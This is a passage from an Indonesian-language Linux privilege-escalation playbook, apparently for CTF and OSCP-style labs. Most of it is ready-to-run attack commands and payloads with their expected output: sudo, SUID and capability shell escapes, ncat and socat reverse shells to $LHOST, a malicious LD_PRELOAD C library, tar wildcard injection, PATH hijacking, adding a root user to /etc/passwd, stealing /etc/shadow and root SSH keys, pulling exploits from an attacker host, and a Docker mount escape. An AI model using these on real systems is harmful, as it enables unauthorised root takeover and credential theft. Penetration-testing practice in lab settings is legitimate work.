sudo awk 'BEGIN {system("/bin/bash")}'

# ============ ENV ============
sudo env /bin/bash

# ============ FIND ============
sudo find . -exec /bin/bash \; -quit

# ============ LESS / MORE / MAN ============
sudo less /etc/passwd
# Di dalam less, ketik: !/bin/bash

sudo more /etc/passwd  
# Di dalam more, ketik: !/bin/bash

# ============ VIM / VI ============
sudo vim -c ':!/bin/bash'
# Atau buka vim lalu ketik: :set shell=/bin/bash :shell

# ============ NANO ============
sudo nano
# Ctrl+R kemudian Ctrl+X → ketik: bash

# ============ TAR ============
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# ============ DD ============
# Baca file sensitif:
sudo dd if=/etc/shadow | head

# ============ TEE ============
# Tulis ke file sensitif (misal tambah user):
echo "hacker:$(openssl passwd -1 hacker123):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd

# ============ NC / NCAT ============
sudo ncat -e /bin/bash $LHOST $LPORT  # reverse shell sebagai root

# ============ SOCAT ============
sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
```

**OUTPUT BERHASIL ✅ — Shell berhasil:**

text

```
root@target:/home/alice# 
```

➡️ **Verifikasi:**

Bash

```
whoami    # → root
id        # → uid=0(root) gid=0(root) groups=0(root)
id -u     # → 0
```

➡️ **Ambil flag:**

Bash

```
cat /root/root.txt
cat /root/proof.txt    # Proving Grounds style
```

**OUTPUT GAGAL ❌ — Command tidak diizinkan:**

text

```
Sorry, user alice is not allowed to execute '/usr/bin/python3.9 -c ...' as root
```

➡️ Path yang kamu pakai **tidak exact** dengan yang di sudoers.  
Cek lagi `sudo -l` dan gunakan path yang **persis sama**:

Bash

```
# Jika sudo -l menampilkan: (ALL) NOPASSWD: /usr/bin/python3
# Maka gunakan PERSIS:
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
# BUKAN: sudo python3 (tanpa full path)
```

**OUTPUT GAGAL ❌ — Binary tidak bisa spawn shell:**

text

```
[proses berjalan tapi tidak ada shell prompt]
```

➡️ Binary mungkin ada restriction. Coba cara lain:

Bash

```
# Coba buat SUID bash dulu
sudo python3 -c 'import os; os.system("chmod +s /bin/bash")'
/bin/bash -p   # Jalankan dengan privilege preserved

# Atau buat file dengan root write
sudo python3 -c 'import os; os.system("echo alice ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers")'
sudo bash
```

---

### Langkah 1.2B — Sudo dengan Password (Credential Known)

Bash

```
# Jika kamu tahu password user saat ini
echo "PASSWORD_HERE" | sudo -S -l

# Jalankan binary yang diizinkan
echo "PASSWORD_HERE" | sudo -S vim -c ':!/bin/bash'
echo "PASSWORD_HERE" | sudo -S python3 -c 'import os; os.system("/bin/bash")'
```

**OUTPUT BERHASIL ✅:**

text

```
root@target:~#
```

**OUTPUT GAGAL ❌ — Password salah:**

text

```
[sudo] password for alice: 
Sorry, try again.
```

➡️ Password tidak cocok. Cari credentials lain dari:

- File config di sistem
- Database files
- History file: `cat ~/.bash_history`
- Credential dari SMB/FTP/web yang sudah di-exploit sebelumnya

---

### Langkah 1.2C — Vim/Editor Shell Escape

Bash

```
# Method 1: Command line argument
sudo vim -c ':!/bin/bash'
sudo vim -c ':set shell=/bin/bash' -c ':shell'

# Method 2: Buka vim lalu escape
sudo vim /etc/passwd
# Di dalam vim:
# :set shell=/bin/bash
# :shell
# ATAU langsung:
# :!/bin/bash

# Method 3: Vi classic
sudo vi
# Di dalam vi:
# :!/bin/bash
```

**OUTPUT BERHASIL ✅:**

text

```
# whoami
root
```

**OUTPUT GAGAL ❌ — vim restricted:**

text

```
E484: Can't open file /bin/bash
```

➡️ Vim dikompilasi tanpa shell access. Coba:

Bash

```
# Tulis payload ke file yang dieksekusi
sudo vim /etc/cron.d/rootme
# Tambahkan: * * * * * root chmod +s /bin/bash
# Tunggu 1 menit lalu: /bin/bash -p
```

---

### Langkah 1.2D — Wildcard Injection Analysis

Bash

```
# Langkah 1: Pahami command apa yang diizinkan
# Contoh: (root) NOPASSWD: /usr/bin/zip *
# Atau:   (root) NOPASSWD: /opt/backup *

# Langkah 2: Pindah ke direktori yang bisa kamu write
cd /tmp
# atau directori yang diproses oleh command

# Langkah 3: Buat script payload
cat > /tmp/pwn.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/pwn.sh

# ============ TAR WILDCARD ============
# Jika sudoers: (root) NOPASSWD: /usr/bin/tar *
cd /tmp
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
sudo tar cf /dev/null *
# Verifikasi:
ls -la /bin/bash   # Harus ada 's' → -rwsr-xr-x
/bin/bash -p

# ============ ZIP WILDCARD ============
# Jika sudoers: (root) NOPASSWD: /usr/bin/zip *
TF=$(mktemp -u)
sudo zip $TF /etc/passwd -T -TT 'sh #'
rm -f $TF

# ============ FIND WILDCARD ============
# Jika sudoers: (root) NOPASSWD: /usr/bin/find *
sudo find / -exec /bin/bash \; -quit

# ============ RSYNC WILDCARD ============
# Jika sudoers: (root) NOPASSWD: /usr/bin/rsync *
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

**OUTPUT BERHASIL ✅ — SUID bash berhasil dibuat:**

text

```
-rwsr-xr-x 1 root root ... /bin/bash
```

Bash

```
/bin/bash -p
# bash-5.1# whoami → root
```

**OUTPUT GAGAL ❌ — Wildcard tidak expand:**

Bash

```
# Cek apakah shell expansion bekerja
echo *   # Harus show file di direktori ini

# Cek apakah program memakai absolute path
strace sudo /usr/bin/tar cf /dev/null * 2>&1 | grep execve
```

➡️ Jika program pakai absolute path untuk semua tools → wildcard injection tidak berlaku untuk PATH trick, tapi mungkin masih berlaku untuk argument injection.

---

### Langkah 1.2E — LD_PRELOAD Abuse

Bash

```
# Langkah 1: Verifikasi kondisi
sudo -l | grep -i env_keep
sudo -l | grep -i env_reset
# Harus ada: env_keep += "LD_PRELOAD"
# Tidak boleh ada: env_reset (atau jika ada, LD_PRELOAD harus di-whitelist)

# Langkah 2: Buat malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

# Langkah 3: Compile
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Langkah 4: Gunakan dengan binary yang diizinkan
# Ganti /usr/bin/BINARY dengan binary dari sudo -l
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/BINARY_YANG_DIIZINKAN
```

**OUTPUT BERHASIL ✅:**

text

```
root@target:/tmp# whoami
root
```

**OUTPUT GAGAL ❌ — LD_PRELOAD tidak bekerja:**

text

```
[binary berjalan normal tanpa shell]
```

➡️ sudo melakukan env sanitization. Verifikasi:

Bash

```
# Cek apakah LD_PRELOAD benar-benar diteruskan
sudo LD_PRELOAD=/tmp/evil.so env | grep LD_PRELOAD
```

➡️ Jika tidak muncul → `env_reset` aktif. LD_PRELOAD tidak bisa digunakan.  
➡️ Coba vector lain: **Fase 2 (SUID)** atau **Fase 3 (Capabilities)**

---

### Langkah 1.3 — Sudo CVE Check

Bash

```
# Cek versi sudo
sudo --version
# Output contoh: Sudo version 1.8.31

# ============ CVE-2019-14287 ============
# Affected: sudo < 1.8.28
# Prerequisite: sudoers punya rule dengan (ALL) atau (!root)
# Contoh sudoers: alice ALL=(ALL,!root) /bin/bash

# Check rule format dulu
sudo -l | grep -E "\(ALL.*\)|!\s*root"

# Exploit jika vulnerable:
sudo -u#-1 /bin/bash
# atau
sudo -u#4294967295 /bin/bash

# ============ CVE-2021-3156 (Baron Samedit) ============
# Affected: sudo 1.8.2 - 1.9.5p1
# Check apakah vulnerable (akan crash jika vulnerable):
sudoedit -s '\' "$(python3 -c 'print("A"*1000)')"
# Output: "Segmentation fault" atau "malloc(): memory corruption" = VULNERABLE

# Download dan jalankan PoC (jika mesin terhubung internet):
# Google: "CVE-2021-3156 PoC github"
# Search: site:github.com CVE-2021-3156
```

**OUTPUT BERHASIL ✅ — CVE-2019-14287:**

text

```
root@target:~# whoami
root
```

**OUTPUT BERHASIL ✅ — CVE-2021-3156 vulnerable:**

text

```
Segmentation fault (core dumped)
```

➡️ Sistem vulnerable. Cari PoC:

Bash

```
# Google search query yang tepat:
# "CVE-2021-3156 exploit github compiled"
# "baron samedit exploit linux x64"

# Jika bisa download ke target:
wget http://$LHOST:8000/exploit_baron_samedit
chmod +x exploit_baron_samedit
./exploit_baron_samedit
```

**OUTPUT AMAN ✅ — Tidak crash:**

text

```
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
```

➡️ Tidak vulnerable. Lanjut ke **Fase 2**.

---

## ═══════════════════════════════════════

## FASE 2: SUID BINARY ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Cari binary dengan SUID bit yang bisa dieksploitasi untuk privilege escalation.

### Langkah 2.1 — Cari Semua SUID Binary

Bash

```
# Command 1: Basic SUID scan
find / -perm -4000 -type f 2>/dev/null

# Command 2: Dengan detail permissions dan owner
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Command 3: Hanya yang owned by root (yang paling penting)
find / -user root -perm -4000 -type f 2>/dev/null

# Command 4: SUID + SGID sekaligus
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | sort

# Command 5: Scan lebih cepat (hanya direktori umum)
find /usr /bin /sbin /opt /home /tmp -perm -4000 -type f 2>/dev/null

# Simpan output untuk dianalisis
find / -perm -4000 -type f 2>/dev/null | tee ~/privesc_loot/output/suid_list.txt
```

**OUTPUT BERHASIL ✅ — Daftar SUID binary:**

text

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/local/bin/python3.8       ← MENARIK (non-standard)
/opt/custom_backup             ← SANGAT MENARIK (custom binary!)
/usr/bin/vim.basic             ← MENARIK (bisa shell escape)
```

**Cara prioritaskan:**

|Prioritas|Binary|Alasan|
|---|---|---|
|🔴 CRITICAL|Binary di `/opt`, `/usr/local`, custom path|Non-standard, mungkin vulnerable|
|🔴 CRITICAL|Interpreter (python, perl, ruby, node, php)|Bisa langsung exec shell|
|🟠 HIGH|Editor (vim, vi, nano, emacs)|Shell escape|
|🟠 HIGH|Pager (less, more, man)|Shell escape|
|🟡 MEDIUM|File tools (find, tar, cp, dd, tee)|File primitive|
|🟢 LOW|Standard OS binary (passwd, su, mount)|Biasanya tidak exploitable|

**OUTPUT TIDAK MENARIK ❌ — Hanya standard binary:**

text

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
```

➡️ Tidak ada SUID yang exploitable. Lanjut ke **Fase 3 (Capabilities)**

---

### Langkah 2.2 — Exploit SUID Interpreter (Python/Perl/Ruby)

Bash

```
# ============ SUID PYTHON3 ============
# Verifikasi dulu
ls -la /usr/local/bin/python3.8
# Harus ada 's': -rwsr-xr-x

# Exploit:
/usr/local/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# Atau:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ============ SUID PERL ============
ls -la /usr/bin/perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# ============ SUID RUBY ============
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ============ SUID PHP ============
php -r 'posix_setuid(0); system("/bin/bash");'

# ============ SUID NODE ============
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio:[0,1,2]})'

# ============ SUID LUA ============
lua -e 'local f=io.popen("id"); print(f:read("*a"))'
# Untuk escalate: perlu binding lua ke C setuid
```

**OUTPUT BERHASIL ✅:**

text

```
uid=1001(alice) gid=1001(alice) euid=0(root) groups=1001(alice)
# id → uid=0(root) gid=0(root) [atau euid=0]
```

**OUTPUT GAGAL ❌ — EUID tidak berubah:**

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

➡️ Binary dikompilasi dengan Python yang drop privileges. Coba:

Bash

```
# Cek versi dan compile flags
python3 -c 'import sys; print(sys.version)'
# Cek apakah binary benar-benar punya SUID
ls -la $(which python3)
stat $(which python3) | grep "Access:"
```

---

### Langkah 2.3 — SUID Bash

Bash

```
# Cek apakah bash punya SUID
ls -la /bin/bash

# Jika output: -rwsr-xr-x (ada 's')
/bin/bash -p
# Flag -p = privileged mode, tidak drop EUID

# Verifikasi
id
# Expected: uid=1001(alice) gid=1001(alice) euid=0(root) groups=1001(alice)
```

**PENTING — Perbedaan `s` dan `S`:**

text

```
-rwsr-xr-x  ← s kecil = SUID aktif + owner execute aktif = EXPLOITABLE
-rwSr-xr-x  ← S besar = SUID aktif + owner execute TIDAK aktif = tidak bisa dieksekusi normal
```

**OUTPUT BERHASIL ✅:**

Bash

```
bash-5.1# whoami
root
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root)
```

**OUTPUT GAGAL ❌ — Privilege tidak elevated:**

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

➡️ Bash versi baru drop privileges secara default meskipun SUID.  
➡️ Pastikan pakai flag `-p`. Jika masih gagal, binary ini tidak vulnerable.

---

### Langkah 2.4 — SUID Editor (Vim/Nano/Less)

Bash

```
# ============ VIM SUID ============
ls -la /usr/bin/vim.basic /usr/bin/vim 2>/dev/null

# Jalankan:
vim.basic -c ':!/bin/bash'
# Atau buka vim dan ketik:
# :set shell=/bin/bash
# :shell
# Atau: :!/bin/bash -p

# ============ LESS SUID ============
ls -la /usr/bin/less

# Jalankan dengan file apapun:
less /etc/passwd
# Di dalam less ketik: !/bin/bash
# Atau: v (buka editor) → cari /etc/passwd lalu run command

# ============ MORE ============
more /etc/passwd
# !/bin/bash

# ============ MAN ============
man ls
# !/bin/bash

# ============ NANO ============
nano
# Ctrl+R → Ctrl+X → ketik perintah bash
# Atau Ctrl+T untuk execute command
```

**OUTPUT BERHASIL ✅ — Shell dari editor:**

text

```
# whoami
root
```

---

### Langkah 2.5 — SUID File Tools (find, tar, cp, dd, tee)

Bash

```
# ============ FIND ============
ls -la /usr/bin/find
find . -exec /bin/sh -p \; -quit

# ============ TAR ============
ls -la /bin/tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# ============ CP — Baca /etc/shadow ============
ls -la /bin/cp
cp /etc/shadow /tmp/shadow_copy
cat /tmp/shadow_copy

# ============ DD — Baca file sensitif ============
ls -la /bin/dd
dd if=/etc/shadow 2>/dev/null

# ============ TEE — Tulis ke /etc/passwd ============
ls -la /usr/bin/tee
# Tambahkan user root baru
echo "hacker:$(openssl passwd -1 'hacker123'):0:0:Hacker:/root:/bin/bash" | tee -a /etc/passwd
su hacker   # gunakan password: hacker123

# ============ PKEXEC (CVE-2021-4034) ============
ls -la /usr/bin/pkexec
# Jika ada, check versi:
pkexec --version
# Affected: polkit < 0.120
# Google: "CVE-2021-4034 PoC github"
```

**OUTPUT BERHASIL ✅ — Shadow file terbaca:**

text

```
root:$6$xyz...:18000:0:99999:7:::
alice:$6$abc...:18500:0:99999:7:::
```

➡️ Crack hash dengan hashcat:

Bash

```
# Di mesin attacker:
hashcat -m 1800 shadow_copy /usr/share/wordlists/rockyou.txt
# atau
john shadow_copy --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Langkah 2.6 — Custom SUID Binary Analysis

> Ini adalah scenario paling umum di CTF. Binary custom = selalu analisis mendalam.

Bash

```
# Anggap ada: /opt/custom_backup (SUID root)

# Step 1: Identifikasi tipe
file /opt/custom_backup

# Step 2: Lihat permission detail
ls -la /opt/custom_backup
stat /opt/custom_backup

# Step 3: Cari string yang tertanam
strings /opt/custom_backup
strings /opt/custom_backup | grep -E "(system|exec|popen|/bin|/usr|PATH|backup|tar|cp|sh)"
```

**OUTPUT `strings` yang MENARIK:**

text

```
Starting backup process...
backup            ← Command tanpa absolute path!
tar               ← Tool yang dipanggil
/usr/bin/tar      ← Atau dengan path... cek lebih lanjut
Backup complete.
```

Bash

```
# Step 4: Trace library calls
ltrace /opt/custom_backup 2>&1 | head -50

# Step 5: Trace system calls (paling penting)
strace /opt/custom_backup 2>&1 | grep -E "(execve|access|openat|system)"
```

**OUTPUT `strace` yang MENARIK — PATH Injection Opportunity:**

text

```
execve("/opt/custom_backup", ["/opt/custom_backup"], ...) = 0
...
execve("backup", ["backup"], ["PATH=/usr/local/sbin:...", ...]) = -1 ENOENT
```

➡️ Binary memanggil `backup` TANPA absolute path! → **PATH Injection (Langkah 2.6A)**

**OUTPUT `strace` — Binary pakai absolute path (tidak vulnerable ke PATH injection):**

text

```
execve("/usr/bin/tar", ["/usr/bin/tar", "-czf", "/backup/data.tar.gz", "/data"], ...) = 0
```

➡️ Pakai absolute path. Cek shared library hijacking → **Langkah 2.6B**

---

### Langkah 2.6A — PATH Injection

Bash

```
# Step 1: Buat fake command
cat > /tmp/backup << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/backup

# Step 2: Verifikasi fake command
cat /tmp/backup
ls -la /tmp/backup

# Step 3: Tambahkan /tmp ke depan PATH
export PATH=/tmp:$PATH

# Step 4: Konfirmasi PATH sudah benar
echo $PATH
which backup   # Harus menunjuk ke /tmp/backup

# Step 5: Jalankan SUID binary
/opt/custom_backup
```

**OUTPUT BERHASIL ✅:**

text

```
# id
uid=1001(alice) gid=1001(alice) euid=0(root) groups=1001(alice)
# whoami
root
```

**OUTPUT GAGAL ❌ — Binary masih tidak menemukan command kita:**

text

```
Starting backup process...
Backup failed: command not found
```

➡️ Binary mungkin set ulang PATH atau pakai secure_path. Verifikasi:

Bash

```
# Cek environment saat binary jalan
strace /opt/custom_backup 2>&1 | grep "PATH"

# Jika binary set PATH sendiri, coba override dengan nama yang berbeda
# Lihat strings untuk tahu PERSIS nama command yang dipanggil
strings /opt/custom_backup | grep -v "^[A-Z]" | head -20
```

---

### Langkah 2.6B — Shared Library Hijacking

Bash

```
# Step 1: Cek dependencies
ldd /opt/custom_backup

# Step 2: Cari library yang missing atau di path yang writable
ldd /opt/custom_backup | grep "not found"

# Step 3: Cek RPATH/RUNPATH (custom library search path)
readelf -d /opt/custom_backup | grep -Ei 'RPATH|RUNPATH'
objdump -x /opt/custom_backup | grep -Ei 'RPATH|RUNPATH'

# Contoh output yang menarik:
# 0x000000000000001d (RPATH)  Library rpath: [/opt/lib]
# → Jika /opt/lib writable, kita bisa taruh library di sana!

# Step 4: Cek apakah RPATH directory writable
ls -la /opt/lib 2>/dev/null || echo "Directory tidak ada"
# Jika bisa write → buat malicious library!

# Step 5: Buat malicious library
cat > /tmp/libcustom.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void inject(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c

# Step 6: Salin ke writable RPATH directory
cp /tmp/libcustom.so /opt/lib/libcustom.so   # Sesuaikan nama dengan yang "not found"

# Step 7: Jalankan binary
/opt/custom_backup
```

**OUTPUT BERHASIL ✅:**

text

```
root@target:/opt# whoami
root
```

**OUTPUT GAGAL ❌ — Library tidak dimuat:**

text

```
/opt/custom_backup: error while loading shared libraries: libcustom.so: cannot open shared object file
```

➡️ Nama library tidak cocok. Cek nama yang exact:

Bash

```
ldd /opt/custom_backup 2>&1 | grep "not found"
# Contoh: libbackup.so.1 => not found
# Maka nama file harus: libbackup.so.1
```

---

## ═══════════════════════════════════════

## FASE 3: LINUX CAPABILITIES

## ═══════════════════════════════════════

> **Tujuan:** Linux capabilities membagi root privilege menjadi pieces. Beberapa capability bisa langsung kasih root shell.

### Langkah 3.1 — Enumerate Capabilities

Bash

```
# Command utama
getcap -r / 2>/dev/null

# Jika getcap tidak ada di PATH
/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

# Scan lebih cepat
getcap -r /usr /bin /sbin /opt /home 2>/dev/null

# Fallback jika getcap tidak tersedia
find / -type f -exec getfattr -n security.capability {} \; 2>/dev/null | grep -B1 "capability"

# Simpan hasil
getcap -r / 2>/dev/null | tee ~/privesc_loot/output/capabilities.txt
```

**OUTPUT BERHASIL ✅ — Ada capability menarik:**

text

```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/ruby2.7 = cap_setuid+ep
/usr/bin/vim = cap_dac_read_search+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/tcpdump = cap_net_raw+eip
/usr/bin/node = cap_net_bind_service+ep
```

**Cara baca capability flags:**

text

```
cap_setuid+ep
         ↑↑
         e = effective (aktif saat binary dijalankan)
         p = permitted (diizinkan untuk di-set)
         i = inheritable (diteruskan ke child process)
```

**Tabel prioritas capability:**

|Capability|Bahaya|Tindakan|
|---|---|---|
|`cap_setuid`|🔴 CRITICAL|→ **Langkah 3.2** — UID 0 langsung|
|`cap_setgid`|🔴 HIGH|→ Set GID 0|
|`cap_dac_override`|🔴 HIGH|→ Bypass file permission check|
|`cap_dac_read_search`|🟠 HIGH|→ **Langkah 3.3** — Baca file apapun|
|`cap_sys_admin`|🔴 CRITICAL|→ Banyak operasi admin|
|`cap_sys_ptrace`|🟠 HIGH|→ Trace/inject process lain|
|`cap_chown`|🟠 HIGH|→ Ubah ownership file|
|`cap_net_raw`|🟡 MEDIUM|→ Raw socket (sniffing)|
|`cap_net_bind_service`|🟢 LOW|→ Bind port <1024|

**OUTPUT KOSONG ❌ — Tidak ada capability:**

text

```
[no output]
```

➡️ Tidak ada file capability. Lanjut ke **Fase 4 (Special Groups)**

---

### Langkah 3.2 — Exploit `cap_setuid`

Bash

```
# ============ PYTHON dengan cap_setuid ============
# Jika: /usr/bin/python3.8 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Atau dengan interactive shell:
python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/bash", "bash")'

# ============ PERL dengan cap_setuid ============
# Jika: /usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# ============ RUBY dengan cap_setuid ============
# Jika: /usr/bin/ruby = cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ============ NODE dengan cap_setuid ============
# Jika: /usr/bin/node = cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio:[0,1,2]})'

# ============ PHP dengan cap_setuid ============
# Jika: /usr/bin/php = cap_setuid+ep
php -r 'posix_setuid(0); system("/bin/bash");'
```

**OUTPUT BERHASIL ✅:**

text

```
root@target:/home/alice# id
uid=0(root) gid=0(root) groups=0(root)
```

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
id: 1 (error)
# atau tidak ada perubahan uid
```

➡️ Verifikasi capability masih ada:

Bash

```
getcap /usr/bin/python3.8
# Harus: /usr/bin/python3.8 = cap_setuid+ep
# Jika tidak ada output → capability sudah dihapus (race condition di lab?)
```

---

### Langkah 3.3 — Exploit `cap_dac_read_search`

> Ini memberi kemampuan baca file APAPUN meskipun permission-nya restricted (misal: /etc/shadow, root's private key)

Bash

```
# ============ TAR dengan cap_dac_read_search ============
# Jika: /usr/bin/tar = cap_dac_read_search+ep

# Baca /etc/shadow
tar -cf /tmp/shadow.tar /etc/shadow 2>/dev/null
tar -xf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow

# Baca SSH private key root
tar -cf /tmp/root_ssh.tar /root/.ssh/ 2>/dev/null
tar -xf /tmp/root_ssh.tar -C /tmp/
cat /tmp/root/.ssh/id_rsa

# ============ VIM dengan cap_dac_read_search ============
# Jika: /usr/bin/vim = cap_dac_read_search+ep

# Baca shadow
vim /etc/shadow

# Baca root's private key
vim /root/.ssh/id_rsa

# ============ PYTHON dengan cap_dac_read_search ============
python3 -c 'print(open("/etc/shadow").read())'
python3 -c 'print(open("/root/.ssh/id_rsa").read())'

# ============ CAT (jika SUID) ============
cat /etc/shadow
cat /root/.ssh/id_rsa
```

**OUTPUT BERHASIL ✅ — /etc/shadow terbaca:**

text

```
root:$6$XNptY9Jy$8WLpVbv...:19000:0:99999:7:::
alice:$6$8wy1S1k...:18500:0:99999:7:::
```

➡️ **Crack hash dan eskalasi:**

Bash

```
# Simpan hash
echo 'root:$6$XNptY9Jy$8WLpVbv...:19000:0:99999:7:::' > /tmp/shadow_hash.txt

# Di mesin attacker - crack dengan hashcat:
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt
# -m 1800 = sha512crypt ($6$)

# Jika berhasil crack, su ke root:
su root   # masukkan password yang di-crack
```

**OUTPUT BERHASIL ✅ — SSH key root terbaca:**

text

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAA...
```

➡️ **Gunakan key untuk SSH:**

Bash

```
# Simpan key
cat /tmp/root/.ssh/id_rsa > /tmp/root_key
chmod 600 /tmp/root_key

# Login sebagai root
ssh -i /tmp/root_key root@localhost
ssh -i /tmp/root_key root@$TARGET_IP
```

---

### Langkah 3.4 — Exploit `cap_dac_override`

> `cap_dac_override` = bypass WRITE permission check. Bisa tulis ke file apapun termasuk /etc/passwd!

Bash

```
# ============ PYTHON dengan cap_dac_override ============
# Jika: /usr/bin/python3 = cap_dac_override+ep

# Tambah root user ke /etc/passwd
python3 -c '
import crypt
hash = crypt.crypt("hacker123", crypt.mksalt(crypt.METHOD_SHA512))
line = "hacker:{}:0:0:Hacker:/root:/bin/bash\n".format(hash)
open("/etc/passwd", "a").write(line)
'
# Kemudian:
su hacker   # password: hacker123
whoami      # → root

# Atau hapus password root (set menjadi kosong):
python3 -c '
data = open("/etc/passwd").read()
data = data.replace("root:x:", "root::")
open("/etc/passwd", "w").write(data)
'
su root   # langsung tanpa password!

# ============ VIM dengan cap_dac_override ============
# Edit /etc/passwd atau /etc/sudoers langsung
vim /etc/sudoers
# Tambahkan: alice ALL=(ALL) NOPASSWD: ALL
# Simpan lalu: sudo bash
```

**OUTPUT BERHASIL ✅:**

Bash

```
su hacker
Password: hacker123
root@target:~# whoami
root
```

---

### Langkah 3.5 — Exploit `cap_sys_ptrace`

> Bisa inject code ke process yang berjalan sebagai root!

Bash

```
# Langkah 1: Cari process root yang berjalan
ps aux | grep root | grep -v "\[" | head -20

# Langkah 2: Pilih process yang stable (bukan kernel thread)
# Contoh: /usr/bin/python3 /app/server.py (PID 1234)
TARGET_PID=1234

# Langkah 3: Inject shellcode menggunakan gdb atau manual ptrace
# Dengan gdb:
gdb -p $TARGET_PID

# Di dalam gdb:
# (gdb) call (void)system("chmod +s /bin/bash")
# (gdb) quit

# Verifikasi:
ls -la /bin/bash   # Harus ada 's'
/bin/bash -p
```

**OUTPUT BERHASIL ✅:**

text

```
-rwsr-xr-x 1 root root ... /bin/bash
bash-5.1# id
uid=1001(alice) gid=1001(alice) euid=0(root)
```

---

## ═══════════════════════════════════════

## FASE 4: AUTOMATED ENUMERATION

## ═══════════════════════════════════════

> Jalankan ini paralel dengan manual enumeration untuk memastikan tidak ada yang terlewat.

### Langkah 4.1 — LinPEAS

Bash

```
# DI MESIN ATTACKER: Siapkan LinPEAS
wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
python3 -m http.server 8000   # Serve dari /tmp

# DI TARGET: Download dan jalankan
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Jalankan dengan output ke file (bisa di-review nanti)
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Atau pipe langsung (tanpa warna)
/tmp/linpeas.sh 2>/dev/null > /tmp/linpeas_out.txt
```

**Output LinPEAS — Cara membaca:**

text

```
[!] COLOR CODING:
    RED/YELLOW = 95% sure it's exploitable
    RED = Interesting
    GREEN = Clean/good
    BLUE = Info
```

**Section PALING PENTING untuk sudo/suid/capabilities:**

text

```
══════════════════╣ Sudo version ╠══════════════════
══════════════════╣ Sudo Rules ╠═══════════════════
══════════════════╣ SUID - Check easy privesc ╠═════
══════════════════╣ Capabilities ╠══════════════════
══════════════════╣ Interesting Groups ╠════════════
```

**Google search jika buntu:**

text

```
Google: "linpeas output [binary name] privilege escalation"
Google: "gtfobins [binary name] suid"
Google: "linux privilege escalation [finding dari linpeas]"
```

---

### Langkah 4.2 — LinEnum (Alternatif)

Bash

```
# Download
wget http://$LHOST:8000/LinEnum.sh -O /tmp/LineEnum.sh
chmod +x /tmp/LinEnum.sh

# Jalankan dengan flag thorough
/tmp/LinEnum.sh -t 2>/dev/null | tee /tmp/linenum_output.txt
```

---

## ═══════════════════════════════════════

## FASE 5: SPECIAL GROUP ABUSE

## ═══════════════════════════════════════

### Fase 5A — Docker Group Escape

Bash

```
# Verifikasi membership
id | grep docker
# atau
groups | tr ' ' '\n' | grep docker

# Verifikasi docker daemon running
docker ps 2>/dev/null
docker info 2>/dev/null | head -5
```

**OUTPUT BERHASIL ✅ — Docker accessible:**

text

```
CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES
```

atau:

text

```
Client: Docker Engine...
```

Bash

```
# Method 1: Mount host filesystem (PALING RELIABLE)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Method 2: Dengan Ubuntu image
docker run -it -v /:/host --rm ubuntu bash
# Di dalam container:
chroot /host bash

# Method 3: Jika alpine tidak ada, pakai image yang tersedia
docker images    # Lihat image yang ada
